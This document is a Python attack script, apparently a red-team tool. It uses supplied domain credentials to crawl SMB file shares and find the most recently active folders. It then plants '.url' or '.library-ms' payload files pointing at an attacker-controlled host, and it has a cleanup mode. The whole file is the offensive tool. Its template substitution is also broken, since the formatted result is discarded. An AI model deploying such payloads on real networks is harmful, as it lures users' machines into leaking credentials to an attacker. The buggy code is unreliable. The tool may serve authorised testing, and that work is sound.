import argparse
from smbclient import ClientConfig, scandir, remove, open_file
from smbprotocol.exceptions import SMBException
from datetime import datetime, timedelta
import sys


def review_folder(folder_rankings, unc_path, active_threshold, depth, fast):
    """
    review_folder(folder_rankings, unc_path, active_threshold, depth, fast)

    :param dict folder_rankings: Dictionary of folder UNC paths and rankings reflecting the number
    of active files in the folder. {<folder UNC path>: <ranking>}
    :param str unc_path: UNC path for the current folder being reviewed
    :param int active_threshold: Number of days within which file access constitutes a file being
    active
    :param int depth: Number of layers of folders to search. 1 searches only the specified folder
    and none of its subfolders.
    :param bool fast: If True, the current folder will be marked as active as soon as a single file
    is found. A rank of 1 will be assigned to all active folders.
    :return: Dictionary of folder UNC paths as keys and rankings as values

    Iterates over files and subfolders starting at the specified UNC path up to the
    specified depth. Each folder is assigned a rank, tracked in folder rankings by its
    UNC path, based on the number of active files it contains. Active files are files
    accessed within the number of days specified in active threshold. If fast is set
    to True, then the folder will receive a rank of 1 or 0 depending on if it contains
    at least one active file or none.
    """
    ranking = 0
    folders = []
    # Use scandir as a more efficient directory listing as it already contains info like stat and
    # attributes.
    for file_info in scandir(unc_path):
        # For files in the directory
        if file_info.is_file():
            # If in fast mode and an active file has already been identified, then move on to the
            # next directory item.
            if fast and ranking > 0:
                # If we do not need to search subdirectories because we've reached the max depth,
                # then stop reviewing files and folders in the directory as soon as one active
                # file is found. Otherwise, continue reviewing items to gather a list of
                # subdirectories for further review.
                if depth - 1 <= 0:
                    break  # Stop reviewing items in the folder
                else:
                    continue  # Move on to the next directory item

            # If the file was recently accessed and is not a payload file
            access_time = datetime.fromtimestamp(file_info.stat().st_atime)

            if datetime.now() - access_time <= timedelta(
                    days=active_threshold) and file_info.name != args.payload:
                # Then increment the ranking of the folder to reflect the level of activity
                ranking += 1

        elif file_info.is_dir():  # Track a list of subfolders in the current folder
            folders.append(f'{unc_path}\\{file_info.name}')

    # For each subfolder in the current folder
    if depth - 1 > 0:  # If the max depth has not been reached
        # Then review each subfolder, appending the results of the review to the folder_rankings
        for subfolder_unc in folders:
            folder_rankings = {**folder_rankings, **review_folder(folder_rankings, subfolder_unc,
                                                              active_threshold, depth - 1, fast)}
            # Requires python 3.9 or greater, commented for >= python 3.5 compatability
            # folder_rankings = folder_rankings | review_folder(folder_rankings, subfolder_unc,
            #                                                  active_threshold, depth - 1, fast)

    # Update folder_rankings with the rank of the current folder and return it
    folder_rankings[unc_path] = ranking
    return folder_rankings


# Parse script arguments
parser = argparse.ArgumentParser(
    description='Identify and rate folders in shares based on access frequency, deploy malicious '
                'URL files, and cleanup results.')

# Always Required
parser.add_argument('--username', required=True, help='Username for authenticating to each share')
parser.add_argument('--password', required=True, help='Password for authenticating to each share')
parser.add_argument('--domain', required=True, help='Domain for authenticating to each share')
parser.add_argument('--targets', required=True,
                    help='Path to a text file containing UNC paths to file shares / base '
                         'directories for deployment or from which to remove payload files')

# For deployment
parser.add_argument('--max-depth', type=int, default=3,
                    help='The maximum depth of folders to search within the share')
parser.add_argument('--active-threshold', type=int, default=2,
                    help='Number of days as an integer for active files')
parser.add_argument('--fast', action='store_true', default=False,
                    help='Mark folders active as soon as one active file in them is identified '
                         'and move on. Scores are not assigned.')
parser.add_argument('--max-folders-per-share', type=int, default=10,
                    help='Maximum number of folders to output as targets per share')
parser.add_argument('--attacker', required='--deploy' in sys.argv,
                    help='Attacker IP or hostname to place in malicious URL')

# For deployment and cleanup
parser.add_argument('--payload', default='@Test_Do_Not_Remove.library-MS', required='--deploy' in
                    sys.argv or '--cleanup' in sys.argv, help='Name of payload file ending in .url'
                                                              ' or .library-ms')

# Modes
parser.add_argument('--identify', action='store_true',
                    help='Identify target folders for payload distribution and output to '
                         'folder_targets.txt')
parser.add_argument('--deploy', action='store_true',
                    help='Deploy payloads to all folder UNC paths listed one per line in the file '
                         'specified in --targets')
parser.add_argument('--cleanup', action='store_true',
                    help='Delete payloads from folder UNC paths specified in --targets')
args = parser.parse_args()

# Setup default login credentials
ClientConfig(username=f'{args.domain}\\{args.username}', password=args.password)

# Read share targets into an array
try:
    with open(args.targets, 'r') as file:
        targets = file.read().splitlines()
except:
    print('Error opening targets file. Make sure it exists and review its permissions.')

# Track rankings for each folder, which are (counterintuitively) scores corresponding to the
# number of active files in a folder. {<folder UNC path>: <ranking>}
folder_rankings = {}

if args.identify:  # If the identification functionality is used to identify active folders
    for share in targets:
        try:
            # Call the appropriate review function based on the --fast flag
            folder_rankings = review_folder(folder_rankings, share, args.active_threshold,
                                            args.max_depth, args.fast)

        except SMBException as e:
            print(f"Error connecting to {share}: {e}")

    # Sort and limit the folder rankings
    sorted_rankings = dict(sorted(folder_rankings.items(), key=lambda item: item[1], reverse=True))
    filtered_rankings = []

    # For each share target in the list
    for share in targets:
        # Filter the dictionary to only include keys that begin with the share target
        matching_share_paths = [key for key in sorted_rankings.keys() if share == key or f'{share}\\' == key[:len(share)+1]]

        # Sort the matching share paths based on their ranking and keep only the top N
        top_matching_share_paths = sorted(matching_share_paths,
                                          key=lambda key: sorted_rankings[key], reverse=True)[
                                   :args.max_folders_per_share]

        # Update the sorted_rankings dictionary with the top N matching share paths
        filtered_rankings.extend(top_matching_share_paths)

    # Write the highest ranked active shares to folder_targets.txt for review and deployment
    with open('folder_targets.txt', mode='w') as f:
        for share_unc in filtered_rankings:
            f.write(share_unc + '\n')

elif args.deploy:  # Else if the deploy functionality is used to deploy payloads
    payloads_written = []  # Track the UNC path of the folder to which each payload is written

    # Select a template file name based on the payload name
    if '.library-ms' in args.payload:
        template_name = 'library_template.library-ms'
    elif '.url' in args.payload:
        template_name = 'url_template.url'

    # Read the payload template contents into a file and substitute the attacker IP or hostname
    with open(template_name, 'r') as template_file:
        payload_contents = template_file.read()
        payload_contents.format(attacker_ip=args.attacker)

    # Iterate over each target folder path
    for folder_unc in targets:
        payload_unc = f'{folder_unc}\\{args.payload}'
        try:  # Try to write the payload
            with open_file(payload_unc, mode='w', newline='\r\n') as payload_file:
                payload_file.write(payload_contents)

            # If writing the payload doesn't fail, track the folder to which it was written
            payloads_written.append(folder_unc)
        except:  # Print a message and don't track the folder if writing the payload to it fails
            print(f'Failed to write payload at: {folder_unc}\\{args.payload}')

    # Save the list of payloads successfully written for easy cleanup
    with open('payloads_written.txt', mode='a') as f:
        for payload_folder_unc in payloads_written:
            f.write(payload_folder_unc + '\n')

elif args.cleanup:  # Else if the cleanup functionality is used to delete deployed payloads
    # Iterate over each folder where payloads were deployed
    for payload_folder in targets:
        try:  # Try to delete the payload file
            remove(f'{payload_folder}\\{args.payload}')
        except:  # Print a message if deletion fails
            print(f'Failed to delete payload at: {payload_folder}\\{args.payload}')
    quit()
